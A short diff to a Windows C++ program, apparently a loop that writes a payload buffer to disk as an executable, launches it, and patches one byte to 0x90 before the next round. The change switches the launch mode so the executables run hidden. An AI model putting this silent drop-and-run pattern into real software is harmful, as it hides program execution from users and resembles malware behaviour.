@@ -1,7 +1,8 @@
 // Unicorn2.cpp : This file contains the 'main' function. Program execution begins and ends there.
 //
 #define _CRT_SECURE_NO_WARNINGS
-#include <iostream>
+#include<stdio.h>
+//#include <iostream>
 #include<Windows.h>
 #include<sys\timeb.h> 
 int NextPayloadSize = 1024;
@@ -80,7 +81,7 @@ int main(int argc, char** argv)
         fwrite(nextPayloadBuf, 1, NextPayloadSize, fp);
         fclose(fp);
         //CreateProcessA(nextEXEName, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi);
-        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_NORMAL);
+        ShellExecuteA(NULL, "open", nextEXEName, NULL, NULL, SW_HIDE);
         Sleep(GapTime);
         nextPayloadBuf[MuPos] = 0x90;
     }
